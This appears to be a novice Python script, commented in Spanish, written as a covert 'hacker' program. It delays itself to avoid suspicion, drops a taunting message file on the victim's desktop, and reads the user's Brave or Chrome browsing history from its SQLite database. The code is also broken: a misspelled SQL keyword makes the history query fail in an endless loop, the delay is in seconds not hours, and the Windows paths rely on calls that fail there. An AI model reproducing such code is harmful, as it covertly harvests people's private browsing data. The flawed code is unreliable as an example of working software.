import os
import sqlite3
from time import sleep
from random import randrange

SYSTEM_OPERATIVE = list(os.uname())[0]
HACKERFILE_NAME = "PARA TI.txt"

# Paths for linux
# Ruta de usuario
user_path_linux = (os.environ["HOME"])
# Ruta de el escritorio
desktop_path_linux = user_path_linux + "/Escritorio/"
# Ruta del archivo del historial
history_path_linux = (user_path_linux +
                      "/.var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser/Default/History")

# Paths for windows
# Ruta de usuario
user_path_windows = (os.environ["HOME"])
# Ruta de el escritorio
desktop_path_windows = user_path_windows + "\\Desktop\\"
# Ruta del archivo del historial
history_path_windows = user_path_windows + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"


def delay_action():
    n_hours = randrange(1, 4)
    n_minuts = randrange(1, 61)
    print("Durmiendo {} horas y {} minutos".format(n_hours, n_minuts))
    sleep(n_hours)


def created_hacker_file():
    if SYSTEM_OPERATIVE == "Linux":
        desktop_path = desktop_path_linux
    else:
        desktop_path = desktop_path_windows

    hacker_file = open(desktop_path + HACKERFILE_NAME, "w")
    hacker_file.write("Hola, soy un hacker y  me he colado en tu sistema.")
    return hacker_file


def get_brave_history():
    if SYSTEM_OPERATIVE == "Linux":
        history_path = history_path_linux
    else:
        history_path = history_path_windows

    try:
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time, url FORM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        connection.close()
        return urls
    except sqlite3.OperationalError:
        return False


def main():
    # Esperaremos entre 1 y 3 horas para no levantar sospechas
    delay_action()
    # Creamos un achivo en el escritorio
    hacker_file = created_hacker_file()
    # Recogemos su historial de Brave
    user_history = False
    while not user_history:
        user_history = get_brave_history()
        delay_action()
        print(user_history)
    print(user_history)


if __name__ == "__main__":
    main()
